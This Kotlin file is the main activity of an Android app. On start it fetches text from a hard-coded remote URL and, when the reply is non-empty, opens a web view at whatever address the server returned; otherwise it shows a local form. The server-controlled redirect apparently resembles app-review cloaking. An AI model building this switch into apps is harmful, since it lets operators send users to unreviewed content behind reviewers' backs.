package com.videogang.tuletkatop.views

import android.annotation.SuppressLint
import android.content.Intent
import android.os.AsyncTask
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.videogang.tuletkatop.databinding.ActivityMainBinding
import com.videogang.tuletkatop.views.WebActivity
import org.jsoup.Jsoup

private var base_url = "https://flowmonet.online/f6QTkjg3"

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var i: Intent? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        OpenWebTask().execute(base_url)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    @SuppressLint("StaticFieldLeak")
    private inner class OpenWebTask : AsyncTask<String, Unit, String>() {
        override fun doInBackground(vararg url: String?): String {
            try {
                 return Jsoup.connect(url[0]).get().body().text()
            } catch (e: Exception) {
                e.printStackTrace()
            }
            return ""
        }

        override fun onPostExecute(result: String?) {
            super.onPostExecute(result)
            i = when (result) {
                "" -> Intent(this@MainActivity, FormActivity::class.java)
                else -> Intent(this@MainActivity, WebActivity::class.java).apply {
                    putExtra(WebActivity.URL, result!!)
                }
            }
            startActivity(i)
        }
    }

}